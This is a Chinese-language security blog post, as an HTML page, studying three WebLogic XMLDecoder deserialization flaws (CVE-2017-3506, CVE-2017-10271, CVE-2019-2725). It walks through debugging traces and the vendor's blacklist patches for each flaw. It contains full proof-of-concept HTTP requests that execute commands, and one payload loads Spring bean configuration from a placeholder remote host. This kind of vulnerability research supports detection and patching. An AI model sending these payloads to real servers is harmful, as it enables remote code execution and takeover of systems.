@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Weblogic XMLDecoder反序列化学习 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2019/05/Weblogic-XMLDecoder反序列化学习/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#weblogic" title="weblogic">weblogic</a>
+                        
+                    </div>
+                    <h1>Weblogic XMLDecoder反序列化学习</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2019-05-19
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>鉴于 @男壹号 大哥的建议，为之前写的一个扫描器又增加了几个POC，顺带学习了下weblogic的几个xmldecoder反序列化漏洞。</p>
+<ul>
+<li>CVE-2017-3506</li>
+<li>CVE-2017-10271</li>
+<li>CVE-2019-2725</li>
+</ul>
+<p>由于之前没有本地调试过weblogic的经验，走了不少弯路，也踩了不少坑。安装和调试的过程可以看。</p>
+<ul>
+<li><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></li>
+</ul>
+<h1 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h1><p>这是一个java中的类，并不是Weblogic特有的，类的位置为<code>java.beans.XMLDecoder</code></p>
+<p>个人理解就是将一个描述java操作的XML文件转换为实际的java操作代码，也类似于一种反序列化的操作，只是载体变成了XML文件。（可能不咋准确</p>
+<p>举个栗子</p>
+<p>poc.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"1"</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后我们利用<code>XMLDecoder</code>类对其进行反序列化操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String path = <span class="string">"src/poc.xml"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XMLDecode_Deserialize(path);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">XMLDecode_Deserialize</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(path);</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(fis);</span><br><span class="line">        XMLDecoder xd = <span class="keyword">new</span> XMLDecoder(bis);</span><br><span class="line">        xd.readObject();</span><br><span class="line">        xd.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行之后可以发现，执行了<code>java.lang.ProcessBuilder(&quot;calc&quot;).start()</code>的操作。</p>
+<p>XML文件里的描述也正是对于执行这样一段代码的描述（或者说序列化），通过XMLDecoder反序列化之后执行了这段代码。</p>
+<p>对于具体XMLDecoder的执行流程，能力有限，本菜就稍微跟着看了下，就不班门弄斧了，感兴趣的可以看。</p>
+<p><a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">https://xz.aliyun.com/t/5069</a></p>
+<h1 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h1><p> 这里测试的Weblogic版本为<code>10.3.6</code></p>
+<p>漏洞触发的POC</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: remember-me=MXPUSANQRVaBJYtUucUgmQ==</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 495</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;  </span><br><span class="line">  &lt;soapenv:Header&gt; </span><br><span class="line">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;  </span><br><span class="line">&lt;java&gt;</span><br><span class="line">	&lt;object class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">		&lt;array class="java.lang.String" length="1" &gt;</span><br><span class="line">			&lt;void index="0"&gt; </span><br><span class="line">				&lt;string&gt;calc&lt;/string&gt;			</span><br><span class="line">			&lt;/void&gt;		</span><br><span class="line">		&lt;/array&gt;</span><br><span class="line">		&lt;void method="start"/&gt;</span><br><span class="line">	&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">    &lt;/work:WorkContext&gt; </span><br><span class="line">  &lt;/soapenv:Header&gt;  </span><br><span class="line">  &lt;soapenv:Body/&gt; </span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>关于漏洞触发点在<a href="https://xz.aliyun.com/t/1848" target="_blank" rel="noopener">https://xz.aliyun.com/t/1848</a>中提到</p>
+<blockquote>
+<p>对于poc中uri中<code>/wls-wsat/CoordinatorPortType</code> 可以换成CoordinatorPortType11等wsat 这个webservice服务中存在的其他uri</p>
+</blockquote>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>断点打在<code>weblogic.wsee.workarea</code> <code>WorkContextXmlInputAdapter</code>的<code>readUTF()</code>，可以看到对应调用的堆栈信息</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Weblogic-XMLDecoder反序列化学习/2.png" alt></p>
+<p>来到<code>weblogic.wsee.jaxws.workcontext</code>的<code>processRequest</code></p>
+<p>可以看到传入的<code>var1</code>就是POST的XML内容，类型为一个<code>Packet</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Weblogic-XMLDecoder反序列化学习/3.png" alt></p>
+<p>然后通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HeaderList var2 = var1.getMessage().getHeaders();</span><br><span class="line">Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+<p>获取到了<code>var3</code>并传入到了<code>this.readHeaderOld(var3);</code>方法中</p>
+<p>再到<code>readHeaderOld</code>中可以看到<code>var4</code>的值正是之前XML数据中的java标签代码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Weblogic-XMLDecoder反序列化学习/4.png" alt></p>
+<p>通过<code>var4</code>生成了<code>var6</code>的<code>WorkContextXmlInputAdapter</code>类，最后调用到了其<code>readUTF()</code>方法，从而进行了<code>XMLDecoder.readObject()</code>的反序列化。</p>
+<h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p>由于本人也不知道怎么拿到weblogic的补丁，于是只能参考别的师傅文章中给出的补丁</p>
+<p>这次的补丁在<code>WorkContextXmlInputAdapter</code>中添加了<code>validate</code>的验证，很明显的黑名单验证</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到限制了<code>Object</code>标签，从而限制通过XML来构造类。也正是因为这样的黑名单限制，所以很快就出了<code>CVE-2017-10271</code></p>
+<h1 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h1><p>这个漏洞存粹就是对上一个漏洞补丁的绕过。直接来看下POC</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: remember-me=MXPUSANQRVaBJYtUucUgmQ==</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 708</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;  </span><br><span class="line">  &lt;soapenv:Header&gt; </span><br><span class="line">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;  </span><br><span class="line">    &lt;java&gt;</span><br><span class="line">        &lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">            &lt;array class="java.lang.String" length="1"&gt;</span><br><span class="line">                &lt;void index="0"&gt;</span><br><span class="line">                	&lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">    &lt;/java&gt;</span><br><span class="line">    &lt;/work:WorkContext&gt; </span><br><span class="line">  &lt;/soapenv:Header&gt;  </span><br><span class="line">  &lt;soapenv:Body/&gt; </span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到唯一的变化就是把之前的<code>Object</code>标签变成了<code>void</code>标签，就轻松的绕过了之前的补丁。</p>
+<p>至于为什么可以的原因在那篇分析XMLDecoder原理的文章中也提到了 <a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">https://xz.aliyun.com/t/5069</a></p>
+<p>这里我也稍微看了下，主要的原因可以通过继承关系看到，<code>VoidElementHandler</code>类继承了<code>ObjectElementsHandler</code>类，并且没有重写<code>addAttribute</code>方法，所有调用时依旧是调用到<code>ObjectElementsHandler</code>中的方法，也就导致了<code>void</code>标签和<code>object</code>的标签都可以生成一个类。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Weblogic-XMLDecoder反序列化学习/5.png" alt></p>
+<p>这回的补丁依旧是黑名单的形式，限制了不少的标签</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure>
+<h1 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h1><p>这个洞时隔两年之后才被放出来</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_async/AsyncResponseService</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 728</span><br><span class="line"><span class="attribute">Cookie</span>: remember-me=MXPUSANQRVaBJYtUucUgmQ==</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;</span><br><span class="line">   &lt;soapenv:Header&gt; </span><br><span class="line">	   &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">	   &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">	   &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">		   &lt;java&gt;</span><br><span class="line">				&lt;class&gt;					&lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;</span><br><span class="line">					&lt;void&gt;</span><br><span class="line">						&lt;string&gt;http://xxxx&lt;/string&gt;</span><br><span class="line">					&lt;/void&gt;</span><br><span class="line">				&lt;/class&gt;</span><br><span class="line">			&lt;/java&gt;</span><br><span class="line">		&lt;/work:WorkContext&gt;   </span><br><span class="line">	&lt;/soapenv:Header&gt;   </span><br><span class="line">	&lt;soapenv:Body&gt;     </span><br><span class="line">	&lt;asy:onAsyncDelivery/&gt;   </span><br><span class="line">	&lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到这回是利用<code>class</code>标签构造类，但是由于限制了<code>method</code>从而无法调用函数，因此，找了几个可以通过构造函数进行反序列化的类。网上通用的有</p>
+<ul>
+<li><code>FileSystemXmlApplicationContext</code></li>
+<li><code>UnitOfWorkChangeSet</code></li>
+</ul>
+<p>至于漏洞的修复，也是一如既往的黑名单，限制的更为严格了。</p>
